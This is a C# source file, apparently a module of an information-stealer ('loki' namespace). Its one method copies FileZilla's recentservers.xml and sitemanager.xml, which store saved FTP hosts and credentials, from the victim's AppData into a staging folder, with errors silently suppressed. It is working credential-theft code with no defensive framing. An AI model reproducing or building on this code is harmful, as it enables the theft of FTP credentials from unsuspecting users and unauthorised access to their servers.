using System;
using System.IO;

namespace loki.loki.Utilies.App;

internal class FileZilla
{
	public static void get_filezilla(string string_0)
	{
		if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\recentservers.xml"))
		{
			return;
		}
		try
		{
			File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\recentservers.xml", string_0 + "\\Apps\\FileZilla\\filezilla_recentservers.xml", overwrite: true);
		}
		catch
		{
		}
		if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\sitemanager.xml"))
		{
			try
			{
				Directory.CreateDirectory(string_0 + "\\Apps\\FileZilla");
				File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\sitemanager.xml", string_0 + "\\Apps\\FileZilla\\filezilla_sitemanager.xml", overwrite: true);
			}
			catch
			{
			}
		}
	}
}
